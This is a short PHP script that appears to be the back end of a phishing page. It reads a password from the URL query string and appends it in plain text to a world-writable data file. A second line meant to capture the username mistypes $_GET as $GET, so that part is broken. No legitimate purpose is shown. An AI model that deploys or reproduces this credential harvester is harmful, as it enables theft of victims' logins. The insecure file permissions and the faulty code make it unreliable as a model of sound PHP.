<?php

ini_set('display_errors', 1);

if (!file_exists('data')) {
    mkdir('data', 0777, true);
    file_put_contents('data/data.txt', '');
}

chmod('data/data.txt', 0777);

$password = $_GET['password'];
$username = $GET['username'];

file_put_contents('./data/data.txt', $username . "\r\n", FILE_APPEND);
file_put_contents('./data/data.txt', $password . "\r\n", FILE_APPEND);
?>